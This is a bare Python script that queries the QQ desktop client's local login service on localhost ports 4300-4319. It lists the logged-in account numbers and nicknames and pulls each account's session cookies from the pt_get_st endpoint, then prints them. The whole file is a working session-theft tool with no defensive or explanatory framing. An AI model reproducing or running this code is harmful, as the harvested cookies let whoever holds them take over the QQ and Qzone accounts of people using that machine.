import re
import requests

def get_info(port):
    session = requests.session()
    login_html = session.get(
        "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=https://qzs.qq.com/qzone/v5/loginsucc.html?para=izone")
    q_cookies = login_html.cookies.get_dict()
    pt_local_token = q_cookies.get("pt_local_token")
    params = {
        "callback": "ptui_getuins_CB",
        "r": "0.8987470931280881",
        "pt_local_tk": pt_local_token
    }
    headers = {
        "Referer": "https://xui.ptlogin2.qq.com/",
        "Host": f"localhost.ptlogin2.qq.com:{port}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0"
    }
    get_uins_req = session.get(f"https://localhost.ptlogin2.qq.com:{port}/pt_get_uins", params=params, cookies=q_cookies,
                          headers=headers, timeout=3)
    uins = re.findall('"uin":(\d+)',get_uins_req.text)
    nickname = re.findall('"nickname":"(.*?)"',get_uins_req.text)
    result = []
    i = 0
    for uin in uins:
        params = {
    "clientuin":uin,
    "r":"0.9059695467741018",
    "pt_local_tk":pt_local_token,
    "callback":"__jp0"
}
        ck_req = session.get(f"https://localhost.ptlogin2.qq.com:{port}/pt_get_st",params=params,cookies=q_cookies,headers=headers)
        ck_cookies = ck_req.cookies.get_dict()
        ck_cookies["nickname"] = nickname[i]
        result.append(ck_cookies)
        i += 1
    return result

result = []

for i in range(4300,4320):
    try:
        result.extend(get_info(i))
    except:
        print(i,'failed')
result = [i for x,i in enumerate(result) if i not in result[:x]]
print(result)